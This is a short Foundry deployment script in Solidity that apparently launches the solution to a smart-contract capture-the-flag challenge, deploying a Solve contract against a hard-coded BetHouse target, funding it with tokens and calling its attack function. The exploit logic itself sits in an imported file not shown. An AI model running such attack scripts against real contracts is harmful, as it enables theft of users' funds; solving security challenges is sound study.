// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "../src/Solve.sol";

contract Deploy is Script {
    address target = 0x491899080AbbfE75d3D90cdD46904BD8b40E575C;
    address player = vm.addr(vm.envUint("USER_PRIVATE_KEY"));
    address poolAddr = IBetHouse(target).pool();
    address depositTokenAddr = IPool(poolAddr).depositToken();

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Solve solve = new Solve(target, poolAddr, depositTokenAddr, player);

        IPoolToken(depositTokenAddr).transfer(address(solve), 5);

        solve.attack{value: 0.001 ether}();

        vm.stopBroadcast();
    }
}